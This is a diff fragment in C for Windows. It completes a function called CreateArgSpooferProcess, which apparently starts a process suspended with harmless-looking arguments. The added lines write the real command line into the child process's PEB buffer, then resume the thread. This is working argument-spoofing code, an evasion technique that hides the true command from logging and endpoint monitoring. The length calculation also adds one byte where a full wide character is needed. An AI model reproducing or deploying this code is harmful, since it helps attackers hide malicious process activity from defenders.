@@ -98,7 +98,32 @@ BOOL CreateArgSpooferProcess(IN LPWSTR szStartupArg, IN LPWSTR szRealArg, OUT DW
 
 	pParms = (PRTL_USER_PROCESS_PARAMETERS)pParmsBuffer;
 
+	if (!pParms) {
+		printf("\t[!] Failed to retrieve valid PEB pointer.\n");
+		return FALSE;
+	}
 	//Writing real args to the target process
 
+	if (!WriteFromTargetProcess(Pi.hProcess, (PVOID)pParms->CommandLine.Buffer, (PVOID)szRealArg, (DWORD)(lstrlenW(szRealArg) * sizeof(WCHAR) + 1))) {
+
+		printf("\t[!] Failed To Write The Real Parameters\n");
+		return FALSE;
+	}
+
+	HeapFree(GetProcessHeap(), NULL, pPeb);
+	HeapFree(GetProcessHeap(), NULL, pParms);
+
+	//Resume the suspended thread
+	ResumeThread(Pi.hThread);
+
+	*dwProcessId = Pi.dwProcessId;
+	*hProcess = Pi.hProcess;
+	*hThread = Pi.hThread;
+
+
+
+	if (*dwProcessId != NULL && *hProcess != NULL && *hThread != NULL)
+		return TRUE;
+	return FALSE;
 
 }
